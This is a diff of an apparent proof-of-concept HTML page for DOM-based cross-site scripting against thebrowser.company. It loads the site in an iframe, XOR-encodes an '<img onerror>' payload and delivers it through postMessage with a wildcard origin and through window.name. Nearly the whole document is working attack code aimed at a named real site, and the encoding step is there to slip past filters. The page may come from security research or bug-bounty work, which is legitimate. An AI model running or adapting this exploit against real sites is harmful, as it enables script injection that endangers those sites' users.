@@ -2,28 +2,31 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>✅ Final XSS PoC – thebrowser.company</title>
+  <title>PoC</title>
 </head>
 <body>
-  <h2>✅ Sending postMessage Payload</h2>
-  <iframe id="target" src="https://thebrowser.company/onboarding" width="100%" height="600" sandbox="allow-scripts allow-same-origin"></iframe>
+  <h2>✅ PoC: DOM XSS via postMessage + window.name</h2>
+  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600"></iframe>
 
   <script>
     function xorEncode(str, key = 0x66) {
       const keyHex = key.toString(16).padStart(2, '0');
-      const encoded = Array.from(str).map(c =>
-        (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0')
-      ).join('');
+      const encoded = Array.from(str).map(c => {
+        return (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0');
+      }).join('');
       return keyHex + encoded;
     }
 
-    const payload = "<script>alert('XSS')</script>";
+    const payload = "<img src=x onerror=alert(1)>";
     const encoded = xorEncode(payload);
-    const iframe = document.getElementById("target");
 
+    const iframe = document.getElementById("target");
     iframe.onload = () => {
-      iframe.contentWindow.postMessage(encoded, "*");
-      console.log("🚀 Payload sent:", encoded);
+      iframe.contentWindow.name = encoded;
+      setTimeout(() => {
+        iframe.contentWindow.postMessage(encoded, "*");
+        console.log("🚀 Payload sent via postMessage + window.name");
+      }, 1000);
     };
   </script>
 </body>
